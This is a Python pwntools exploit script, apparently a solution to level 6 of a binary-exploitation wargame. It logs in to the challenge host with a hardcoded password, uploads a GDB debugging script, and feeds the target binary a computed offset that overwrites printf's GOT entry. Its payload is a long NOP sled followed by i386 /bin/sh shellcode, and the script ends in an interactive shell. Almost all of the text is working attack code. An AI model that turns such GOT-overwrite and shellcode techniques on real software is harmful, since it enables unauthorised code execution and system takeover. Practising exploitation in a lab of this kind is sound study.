from lib.exploit import *


# ONLY WORKS IN GDB, del breakpoints before continuing into shellcode

gdb_script = '''
set disassembly-flavor intel   
alias gil = disassemble

def show_ret
x/2wx $ebp
end

def show_args
x/3wx $esp
end

def nextt
si
finish
end

# find env vars
def show_stack
x/20wx $ebp
end

unset env
show env


def table_adr
x $ebp-0x30
end

# first strtlong input
shell echo "input"
b *0x08048530

# second strtlong
shell echo "pos"
b *0x08048548

# malloc
b *0x080484fd

# strcpy
b *0x08048584

# overwrite got
b *0x08048573

# on nopslide
# b *0x0805000b


r `cat pos` `cat input` `cat payload`

'''

LEVEL = "6"

def prepare_env(s):
    s.process(["rm", "-rf", CWD]).recvall()
    s.process(["mkdir", CWD]).recvall()
    upload(s, gdb_script, CWD + "gdb.script")

    # remote_wrapper = CWD + "wrapper"
    # wrapper_src = read("./5/wrapper.cpp")
    # upload(s, wrapper_src, CWD + "wrapper.cpp")
    # log.warn("%s " % s.process(["gcc", "-m32", "-no-pie", "wrapper.cpp", "-o", "wrapper"], cwd=CWD).recvall())
    # log.info("%s " % s.process(["chmod", "a+x", remote_wrapper], cwd=CWD).recvall())


# s = connect_to_local(LEVEL, "woucaejiek", remote=False)
s = connect(LEVEL, "eiluquieth")
from lib.exploit import *

prepare_env(s)

struct_table_adr = 0xffff7d78
printf_got = 0x80498c0
off_until_got = (int) ((struct_table_adr - printf_got)/4)*-1
log.info("off_until_got: " + hex(off_until_got))
# off_until_got = 0x80000001
# log.info(f"off_until_got: " + hex(off_until_got))
# payload_adr = 0x0804a008 + 50

pos = str(off_until_got)
log.info(f"pos: {pos}")
upload(s, pos, CWD+"pos")

# already 0x6000 off to nopslide
input = "8050008"   # add 50 to hit nopslide
log.info(f"input: {input}")
upload(s, input, CWD+"input")

payload = b"\x90"*0x6050
payload += asm(pwnlib.shellcraft.i386.sh())
log.info(f"payload: {payload}")
upload(s, payload, CWD+"payload")

io = s.process(["env", "-i", BINARY_PATH, pos, input, payload])
io.interactive()



